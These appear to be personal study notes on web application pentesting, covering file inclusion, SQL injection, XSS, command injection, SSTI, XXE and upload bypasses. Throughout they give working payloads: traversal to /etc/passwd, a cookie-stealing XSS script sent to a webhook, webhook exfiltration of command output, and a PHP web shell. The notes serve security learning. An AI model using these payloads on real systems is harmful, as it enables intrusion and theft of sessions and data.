### Local File Inclusion
- This is a vulnerability where there is no safety mechanism set to prevent accessing files in the local server.
- for eg: `https://example.com/contact?filename=contacts.txt` this link look for the file contacts and print it to the screen.
- we can modify this link to access sensitive files like this: `https://example.com/contact?filename=../../../../../etc/passwd` If it is vulnerable it will give out the contents passwd file.
- https://github.com/swisskyrepo/PayloadsAllTheThings : this repo is a good place to look around the payloads for testing.
- In burp pro we can use the path traversal list from the intruder payload section.
- sometimes the server look for characters like `../` and remove it before processing.
- One way to bypass it is by right click on the selection and encode it.(Not always work)
- maybe the server is using recursive filtering then we can use : `..././..././..././..././`
- what we did is we place ../ in the middle of each to bypass the recursive filtering.
### Remote File Inclusion
- Similar to LFI but we can include links to file in the place where we do LFI.
- eg : `https://example.com/contact?filename=https://google.com/notes.txt`
- The file is don't necessarily have to be mentioned in the url if it is an API driven application.
- Burp can be used to intercept the traffic and repeat it.
### SQL Injection
- If we can execute malicious SQL code in a text field to obtain information that we not suppose to see that is called SQL Injection.
- For eg in an app where we enter the username to obtain the email adress a output. We might be able to enter `jeremy' OR 1=1#` This might evaluate the SQL code as true and returns all the result.
- `jeremy' union select null,null#` what this command is used is for identifying how many number of column is selected. Increase the number of null until a result is obtained.
- if there is 3 columns being selected we do something like `jeremy' union select,select,version()#`. Which returns the version of the database.
- we can see all the table names with `jeremy' union select,select,table_name from information_schema.tables#` 
- Now the symbol # depends on the database we are using. It can also be -- - based on the database.
- There is a cheat sheet available at : https://portswigger.net/web-security/sql-injection/cheat-sheet
### Blind SQL Injection 
- There might be other injection points other than the input fields that are vulnerable to injection Attacks.
- the parameter field of the post request maybe vulnerable
- the session cookie field of the request maybe vulnerable.
- we can use SQL map to test for vulnerabilities automatically.
- we can automate the SQL vuln scanning by using sqlmap.
- copy the request to a text file.
- then use : `sqlmap -r req.txt`.
- The vulnerability doesn't have to be on the post request. It can be on the get request which contain session cookies also.(SQL Injection when processing the cookie by server.)
- Now this particular type injection doesn't return any data. 
- But we can ask database questions like 'is the first letter of password is a'.
- we substring function for this attack.
- A simple example of this would be in the request: `Cookie : session=<session token> and substring(select version(),1,1) = '8'`.
- What happens in the above request is that the first character of the version number is checked whether it's equal to '8'. If it is, the request get accepted and show the success request output.
- To automate this we can use : `sqlmap -r req.txt --level=2 --dump`.
- if we know the table name and only want to dump contents from that particular table we can use: `sqlmap -r req.txt --level=2 -T < table_name > --dump`.
### Cross Site Scripting
- Three types: 
	- **Reflected** : Malicious script comes from the current HTTP request and is reflected back in the response.
		- Only useful if it can be used in the URL. otherwise use attacking a target.
	- **Stored** : Malicious script is permanently stored on the server (e.g., database, comment section, user profile) and served to users later.
		- Attacker posts `<script>alert(1)</script>` in a forum comment; any visitor sees the pop-up.
	- **DOM-based** : Malicious script execution happens entirely on the **client side** due to insecure JavaScript modifying the DOM, without needing a new page load or server response injection
		- The vulnerability is not in the server, but in the **client-side JavaScript** running in the browser.
- If we managed to find a XSS vulnerability we can use something like `function logKey(event){console.log(event.key)}` and then `document.addEventListener('keydown', logKey)` What this does is print the key pressed to the console. we can may be send this to API and log the key pressed by the victim.
- to learn java script **w3school** can be a great resource.
- For testing XSS we can use : `<scritpt>alert(1)</script>` or `<script>prompt(1)</script>`
- sometime simple one like alert might be blocked.
- When we are listening for user interaction like sending the cookie to our system for that we can use **netcat**. or we can simply use https://webhook.site  which listen for requests it receive.
- A most used payload will be : `<script>var i = new Image;i.src="<webhook link or nc listner>"+document.cookie;</script>` this send a request to fetch the image along with the cookie also.
### Command Injection
- There might be fields where we can input and eval() command is used to execute the functionality.
- Without a proper sanitation we can execute other commands also.
- for example a input field which accept a domain and do a ping command in background and output a result to the screen.
- we can use operators like `;` to isolate the command and execute another command like `whoami` or any other command. maybe a command to get a reverse shell also.
- This vulnerability is command injection.
### Blind Command Injection
- This command injection doesn't directly give the output to the screen.
- But we can get the result of command injection from the request.
- I.e `http://webhook.site/<uniq-id>?q='whoami'` Now the resulting request send to the web hook contains actually the result of the whoami command. Now the whoami is not enclosed in quotes but in **back-quotes** .
### Server-Side Template Injection
- When user input is directly embedded into a server-side template without proper sanitation or validation it leads to SSTI vulnerability.
- Since many web frameworks (like Jinja2 in Python, Twig in PHP, Mako, etc.) allow dynamic code execution inside templates, an attacker can inject malicious template expressions that the server will execute.
- Just like any other injection attacks we have an input field.
- we can try something basic like `{{7*7}}`
- If it returns  49 the site is vulnerable to SSTI. Based on the template engine used the payload may vary.
- we can use https://book.hacktricks.xyz and look for ssti to get example payloads based on template engine.
- we can use `Fuzzing - template injection` list on burp suite pro , get it from GitHub or payload all the things.
- Sometimes based on the result we get on the browser it may seem that there is no template injection. but if we view it in burp we can see that the command get executed. but the in some cases the client side java script covers this vulnerability making it difficult to detect the vulnerability just by simple test.
### XML External Entity Injection (XXE)
- This vulnerability might exist if an application accepts a XML upload.
- This vulnerability is not seen anymore. but it is worth testing for it.
- The following is an example malicious payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```
This get the contents from the /etc/passwd and place at position &xxe.
- A safe example of xml would be this:
```
<?xml version="1.0" encoding="UTF-8"?>
<creds>
    <user>testuser</user>
    <password>testpass</password>
</creds>
```

### Insecure File Uploads
- Vulnerable file uploads allow the upload of files and executing it later on.
- we can upload some payloads that might give us reverse shell when the upload file is accessed.
- The most common one is php reverse shell payloads.
- The file upload may only allows upload of certain file types.
- In other cases there might be java script code that check the uploaded file with server in such cases we can simply disable the java script as it client side.
- We need to find where the file is being uploaded. we might need to fuzz for that directory if it is not mentioned anywhere.
- A simple php payload would be `<?php system($_GET['cmd']); ?>`
-  then we can simply pass on a command like `https://example.com/upload/payload.php?cmd=cat /etc/passwd` which would yield us results.
- we can modify the request from burp and do the file upload. but what if the check is from server side?
- Sometimes the server only look for the extension in the request. then we can do :
- `filename="logo3.php%00.png"` the %00 is call null byte which omit. This method works for older servers.
- Otherwise some web servers use regex and only look for png in the file name and without checking the end of line. then we can do : `filename="logo3.php.png"`
- If the check is server side and it only looks for the magic bytes of the file then we can simply put the payload between a image file itself inside the request and keep the first few part and last part. but use the file name with php extension so that it executes. This might work sometimes.
- we can also use other php extension. we can get those extensions simply by searching valid php extensions like phtml, php4, php5,php7,etc 
- More reading materials and labs are there in PortSwigger labs.